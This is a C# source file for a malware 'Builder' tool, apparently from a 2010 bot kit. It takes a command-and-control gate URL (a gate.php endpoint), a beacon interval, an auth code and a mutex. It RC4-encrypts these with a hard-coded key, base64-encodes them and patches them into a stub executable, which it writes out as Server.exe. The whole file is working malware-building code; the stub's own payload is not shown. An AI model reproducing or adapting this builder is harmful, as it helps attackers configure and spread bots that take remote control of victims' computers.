using System;
using System.Text;
using System.IO;
using System.Windows.Forms;

namespace Builder
{
    /* Copyright © 2010 w!cked */

    public partial class fMain : Form
    {
        private string sSplit = "XPADDINGX";
        private string sCryptPW = "N0PE";
        private string sStubPath = Environment.CurrentDirectory + @"\Stub\Stub.exe";
        private string sCreatePath = Environment.CurrentDirectory + @"\Server.exe";

        public fMain()
        {
            InitializeComponent();
        }

        private void fMain_Load(object sender, EventArgs e)
        {
            lstMenu.Items.Add("Information");
            lstMenu.Items.Add("Builder");
            lstMenu.SelectedIndex = 0;
            txtAuthCode.Text = "N0PE";
            txtMutex.Text = cFunctions.genString(new Random().Next(8, 20));
            txtMutex.ReadOnly = true;
            txtServerAddress.Text = "http://server.com/path/gate.php";
            txtInformation.SelectionStart = 0;

            gBuilder.Hide();
            gInformation.Show();
        }

        private void lstMenu_SelectedIndexChanged(object sender, EventArgs e)
        {
            switch (lstMenu.SelectedIndex)
            {
                case 0:
                    gBuilder.Hide();
                    gInformation.Show();
                    break;
                case 1:
                    gInformation.Hide();
                    gBuilder.Show();
                    break;
            }
        }

        private void bBuild_Click(object sender, EventArgs e)
        {
            byte[] bStub = new byte[0];
            byte[] bInfos = new byte[0];
            BinaryReader rReader;
            BinaryWriter rWriter;

            if (txtServerAddress.TextLength <= 0) { MessageBox.Show(null, "Please declare a Server Address first !", "Builder", MessageBoxButtons.OK, MessageBoxIcon.Error); return; }
            else if (!txtServerAddress.Text.ToString().StartsWith("http://")) { MessageBox.Show(null, "The Server Address is invalid !", "Builder", MessageBoxButtons.OK, MessageBoxIcon.Error); return; }

            if (txtAuthCode.TextLength <= 0) { MessageBox.Show(null, "Please declare a Authentication Code first !", "Builder", MessageBoxButtons.OK, MessageBoxIcon.Error); return; }
            if (txtMutex.TextLength <= 0) { MessageBox.Show(null, "Please declare a Program Mutex first !", "Builder", MessageBoxButtons.OK, MessageBoxIcon.Error); return; }

            string sParameters = sSplit + txtServerAddress.Text.ToString() + sSplit + nuInterval.Value.ToString() + sSplit + txtAuthCode.Text.ToString() + sSplit + txtMutex.Text.ToString() + sSplit;
            bInfos = Encoding.Default.GetBytes(sParameters);
            cCrypt.RC4(ref bInfos, sCryptPW);
            bInfos = Encoding.Default.GetBytes(Convert.ToBase64String(bInfos));
            
            try
            {
                rReader = new BinaryReader(File.Open(sStubPath, FileMode.Open));
                bStub = new byte[(int)rReader.BaseStream.Length];
                rReader.Read(bStub, 0, (int)rReader.BaseStream.Length);
                rReader.Close();
            }
            catch { }

            if (bStub.Length <= 0) { MessageBox.Show(null, "Error reading Stub !", "Builder", MessageBoxButtons.OK, MessageBoxIcon.Error); return; }
            if (File.Exists(sCreatePath)) { File.Delete(sCreatePath); }

            Array.Copy(bInfos, 0, bStub, (bStub.Length - 460), bInfos.Length);

            rWriter = new BinaryWriter(File.Open(sCreatePath, FileMode.CreateNew));
            rWriter.Write(bStub);
            rWriter.Flush();
            rWriter.Close();

            MessageBox.Show(null, "Server successfully builded !", "Builder", MessageBoxButtons.OK, MessageBoxIcon.Information);
            return;
        }

        private void bGenerateMutex_Click(object sender, EventArgs e)
        {
            txtMutex.Text = cFunctions.genString(new Random().Next(8, 20));
        }
    }
}
